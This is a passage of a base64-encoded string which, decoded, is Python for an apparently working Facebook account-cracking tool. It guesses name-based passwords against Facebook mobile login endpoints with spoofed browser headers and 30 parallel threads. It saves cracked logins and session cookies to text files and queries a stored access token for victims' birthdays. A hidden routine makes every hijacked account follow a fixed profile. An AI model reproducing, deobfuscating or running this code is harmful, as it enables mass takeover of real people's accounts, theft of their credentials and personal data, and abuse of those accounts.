IREldICVzIHwgJXMgJyAlIChLLHVzZXIscHcpKQogICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykKICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ2ZhaGltLWNwLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJwogICAgICAgICAgICAgICAgICAgIGRheSAgID0gJycKICAgICAgICAgICAgICAgICAgICB5ZWFyICA9ICcnCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgcHJpbnQoJ1xyJXMgXDAzM1sxOzkxbVtDUC1NQUhESV0gJXMgfCAlcyAnICUgKEssdXNlcixwdykpCiAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQogICAgICAgICAgICAgICAgb3BlbignZmFoaW0tY3AudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgbG9vcCArPSAxCgogICAgZGVmIF9fbWV0b2RlX18oc2VsZiwgdXNlciwgX19jaGlfXywgY2Vib2spOgogICAgICAgIGdsb2JhbCBvayxjcCxsb29wCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyIFtNQUhESV0ge2xvb3B9L3tsZW4oc2VsZi5pZCl9IC0tIE9LOi0ge2xlbihvayl9IC0gQ1A6LSB7bGVuKGNwKX0gJyksCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgcHcgaW4gX19jaGlfXzoKICAgICAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQogICAgICAgICAgICAgICAgc2Vzc2lvbj1yZXF1ZXN0cy5TZXNzaW9uKCkKICAgICAgICAgICAgICAgIGhlYWRlciA9IHsKICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2Vib2ssCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwKICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik5va2lhQzMtMDAvNS4wICgwOC42MykgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsCiAgICAgICAgICAgICAgICAgICAgImRudCI6IjEiLAogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8iLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL3tjZWJva30vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsIGhlYWRlcnM9aGVhZGVyKQogICAgICAgICAgICAgICAgZGFzID0gewogICAgICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHIudGV4dCkpLmdyb3VwKDEpLAogICAgICAgICAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICAgICAgICAgInVpZCI6dXNlciwKICAgICAgICAgICAgICAgICAgICAiZmxvdyI6ImxvZ2luX25vX3BpbiIsCiAgICAgICAgICAgICAgICAgICAgInBhc3MiOnB3LAogICAgICAgICAgICAgICAgICAgICJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBoZWFkZXIxID0gewogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKICAgICAgICAgICAgICAgICAgICAiY2FjaGUtY29udHJvbCI6Im1heC1hZ2U9MCIsCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwKICAgICAgICAgICAgICAgICAgICAib3JpZ2luIjoiaHR0cHM6Ly8iK2NlYm9rLAogICAgICAgICAgICAgICAgICAgICJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLAogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUc3ODBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Mi4wLjQ1MTUuMTY2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAieC1yZXF1ZXN0ZWQtd2l0aCI6IlhNTEh0dHBSZXF1ZXN0IiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwKICAgICAgICAgICAgICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vIitjZWJvaysiL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBwbyA9IHNlc3Npb24ucG9zdChmImh0dHBzOi8ve2NlYm9rfS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCIsIGRhdGEgPSBkYXMsIGhlYWRlcnMgPSBoZWFkZXIxLCBhbGxvd19yZWRpcmVjdHMgPSBGYWxzZSkKICAgICAgICAgICAgICAgIGlmICdjX3VzZXInIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOgogICAgICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkKICAgICAgICAgICAgICAgICAgICBwcmludChmJ1xye0h9IFtPSy1NQUhESV0ge3VzZXJ9IHwge3B3fScpCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgICAgIG9rLmFwcGVuZCh3cnQpCiAgICAgICAgICAgICAgICAgICAgb3BlbignZmFoaW0tb2sudHh0JyAsICdhJykud3JpdGUoJyVzXG4nICUgd3J0KQogICAgICAgICAgICAgICAgICAgIHNlbGYuZm9sbG93KHNlc3Npb24sY29raSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwX3R0bCA9IHNlc3Npb24uZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VzZXJ9P2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49e3Rva2Vuen0nKS5qc29uKClbJ2JpcnRoZGF5J10KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNwX3R0bC5zcGxpdCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyBcMDMzWzE7OTFtW0NQLU1BSERJXSAlcyB8ICVzICcgJSAoSyx1c2VyLHB3KSkKICAgICAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCdmYWhpbS1jcC50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gJycKICAgICAgICAgICAgICAgICAgICAgICAgZGF5ICAgPSAnJwogICAgICAgICAgICAgICAgICAgICAgICB5ZWFyICA9ICcnCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyBcMDMzWzE7OTFtW0NQLU1BSERJXSAlcyB8ICVzICcgJSAoSyx1c2VyLHB3KSkKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICBvcGVuKCdmYWhpbS1jcC50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgbG9vcCs9MQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc2VsZi5fX21ldG9kZV9fKHVzZXIsIHB3LCBjZWJvaykKIyAgICA8LSBCb3QgZm9sbG93ZXJzIC0+CiAgICBkZWYgZm9sbG93KHNlbGYsc2Vzc2lvbixjb2tpKToKICAgICAgICByID0gQmVhdXRpZnVsU291cChzZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA2NTUzMzY2OTI5OSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQsImh0bWwucGFyc2VyIikKICAgICAgICBnZXQgPSByLmZpbmQoImEiLHN0cmluZz0iSWt1dGkiKS5nZXQoImhyZWYiKQogICAgICAgIHNlc3Npb24uZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK3N0cihnZXQpLGNvb2tpZXM9eyJjb29raWUiOmNva2l9KS50ZXh0CgogICAgZGVmIF9fcGxlcl9fKHNlbGYpOgogICAgICAgIGNoaSA9ICgnMycpCiAgICAgICAgaWYgY2hpID09ICcnOgogICAgICAgICAgICBwcmludCgnXG5TZWxlY3QgQ29ycmVjdCBPbmUnKTtzZWxmLl9fcGxlcl9fKCkKICAgICAgICBlbGlmIGNoaSBpbiAoJzEnLCAnMDEnKToKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIGxvZ28oKQogICAgICAgICAgICBwcmludCgnJykKICAgICAgICAgICAgcHJpbnQoJyBcMDMzWzE7OTdtWytdIFRvdGFsIElEcyA6ICVzJXMnICUobGVuKHNlbGYuaWQpLE8pKQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5N21Zb3VyIFByb2Nlc3MgU3RhcnRlZCBpbiBCYWNrZ3JvdW5kJykKICAgICAgICAgICAgcHJpbnQoJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQogICAgICAgICAgICBwcmludCgnJykKICAgICAgICAgICAgd2l0aCBCaWxhbEJTTihtYXhfd29ya2Vycz0zMCkgYXMga2lyaW06CiAgICAgICAgICAgICAgICBmb3IgeW50a3RzIGluIHNlbGYuaWQ6ICMgWW8gTmRhayBUYXUgS29rIFRhbnlhIFNhaWEKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHludGt0cy5zcGxpdCgnfCcpCiAgICAgICAgICAgICAgICAgICAgICAgIHh6ID0gbmFtZS5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih4eikgPT0gMyBvciBsZW4oeHopID09IDQgb3IgbGVuKHh6KSA9PSA1IG9yIGxlbih4eikgPT0gNjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBraXJpbS5zdWJtaXQoc2VsZi5fX2FwaV9fLCB1aWQsIHB3eCkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQogICAgICAgIGVsaWYgY2hpIGluICgnMicsICcwMicpOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgbG9nbygpCiAgICAgICAgICAgIHByaW50KCcnKQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5N21bK10gVG90YWwgSURzIDogJXMlcycgJShsZW4oc2VsZi5pZCksTykpCiAgICAgICAgICAgIHByaW50KCcgXDAzM1sxOzk3bVlvdXIgUHJvY2VzcyBTdGFydGVkIGluIEJhY2tncm91bmQnKQogICAgICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCiAgICAgICAgICAgIHByaW50KCcnKQogICAgICAgICAgICB3aXRoIEJpbGFsQlNOKG1heF93b3JrZXJzPTMwKSBhcyBraXJpbToKICAgICAgICAgICAgICAgIGZvciB5bnRrdHMgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0geW50a3RzLnNwbGl0KCd8JykKICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCiAgICAgICAgICAgICAgICAgICAgICAgIGtpcmltLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibWJhc2ljLmZhY2Vib29rLmNvbSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBoYXNpbChvayxjcCkKICAgICAgICBlbGlmIGNoaSBpbiAoJzMnLCAnMDMnKToKCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBsb2dvKCkKICAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgIHByaW50KCcgXDAzM1sxOzk3bVsrXSBUb3RhbCBJRHMgOiAlcyVzJyAlKGxlbihzZWxmLmlkKSxPKSkKICAgICAgICAgICAgcHJpbnQoJyBcMDMzWzE7OTdtWW91ciBQcm9jZXNzIFN0YXJ0ZWQgaW4gQmFja2dyb3VuZCcpCiAgICAgICAgICAgIHByaW50KCctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKICAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgIHdpdGggQmlsYWxCU04obWF4X3dvcmtlcnM9MzApIGFzIGtpcmltOgogICAgICAgICAgICAgICAgZm9yIHludGt0cyBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB5bnRrdHMuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSx4elswXSsnMTIzNCcseHpbMF0rJzEyMzQnLHh6WzBdKycxMjM0NScseHpbMF0rJzc4NiddCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSx4elswXSsnMTIzNCcseHpbMF0rJzEyMzQnLHh6WzBdKycxMjM0NScseHpbMF0rJzc4NiddCiAgICAgICAgICAgICAgICAgICAgICAgIGtpcmltLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibS5mYWNlYm9vay5jb20iKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJ1xuIFNlbGVjdCBWYWxpZCBPbmUnKTsoc2VsZi5fX3BsZXJfXygpKQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICAgICAgIG1haGRpKCkK"))

